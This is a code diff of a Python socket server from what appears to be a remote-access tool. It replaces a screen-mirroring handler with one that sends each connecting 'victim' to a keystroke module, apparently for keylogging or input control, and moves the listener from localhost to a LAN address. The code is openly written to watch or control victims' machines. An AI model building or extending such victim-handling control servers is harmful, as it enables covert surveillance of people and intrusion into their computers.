@@ -1,37 +1,30 @@
 import socket
+import sys
 import threading
-
-from modules.protocol import Protocol
-from screen_mirroring.screen_capture import ScreenShare
+from ..input_control.keystroke_control import KeyStrokes
 
 
-class Server(Protocol):
+class Server:
 
-    def __init__(self, server, port):
-        Protocol.__init__(self, server, port)
-        self.screen_share = ScreenShare((1920, 1080), 'RGBA')
+    def __init__(self, ip, port):
+        self.IP = ip
+        self.PORT = port
+        self.ADDR = (ip, port)
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.bind(self.ADDR)
-        thread = threading.Thread(target=self.screen_share.screen_display)
-        thread.start()
-
 
     def handel_victim(self, conn):
-        while True:
-            data = self._recv_packet(conn)
-            frame = self.screen_share.image_frombytes(data)
-            self.screen_share.update_screen(frame)
+        KeyStrokes.transmit(conn)
 
     def start(self):
         self.server.listen()
-        print(f'LISTENING... ({self.SERVER}:{self.PORT})')
+        print(f'LISTENING... ({self.IP}:{self.PORT})')
         try:
             while True:
                 conn, addr = self.server.accept()
-                thread = threading.Thread(target=self.update, args=(conn,))
-                thread2 = threading.Thread(target=self.screen_display)
+                print('connection from:', addr)
+                thread = threading.Thread(target=self.handel_victim, args=(conn,))
                 thread.start()
-                thread2.start()
         except Exception as e:
             print(e)
             self.server.close()
@@ -39,4 +32,4 @@ class Server(Protocol):
 
 if __name__ == '__main__':
     print('SERVER IS STARTING :)')
-    Server('localhost', 8832).start()
+    Server('192.168.1.125', 1111).start()
